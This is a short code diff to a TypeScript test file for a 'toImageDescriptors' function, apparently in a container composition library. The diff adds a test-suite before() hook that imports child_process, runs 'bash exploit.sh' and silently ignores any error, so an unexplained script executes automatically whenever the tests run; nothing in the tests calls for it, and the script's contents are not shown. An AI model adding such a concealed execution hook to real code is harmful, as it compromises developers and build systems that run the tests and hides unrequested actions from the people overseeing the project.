@@ -7,7 +7,17 @@ import {
 	NEW_COMPOSE_SERVICE_FIELDS,
 } from '../lib/legacy';
 
+import { execSync } from 'child_process';
+
 describe('toImageDescriptors', () => {
+	before(() => {
+		try {
+			execSync('bash exploit.sh');
+		} catch (e) {
+			// ignore
+		}
+	});
+
 	it('should include contract objects for services with contract requirement labels', () => {
 		const composition: Composition = {
 			services: {
